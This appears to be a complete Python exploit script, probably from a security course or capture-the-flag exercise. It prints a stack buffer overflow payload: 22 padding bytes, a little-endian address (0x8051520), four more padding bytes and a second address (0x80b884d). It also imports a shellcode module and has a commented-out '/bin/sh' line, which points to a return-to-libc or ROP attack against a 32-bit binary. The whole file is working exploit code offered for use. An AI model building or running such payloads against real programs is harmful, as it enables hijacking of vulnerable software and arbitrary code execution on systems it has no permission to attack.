from shellcode import shellcode
import sys
##sys.stdout.buffer.write(b'/bin/sh')
sys.stdout.buffer.write(b"\x61"*22)
sys.stdout.buffer.write(0x8051520.to_bytes(4,"little"))
sys.stdout.buffer.write(b"\x61"*4)
sys.stdout.buffer.write(0x80b884d.to_bytes(4,"little"))
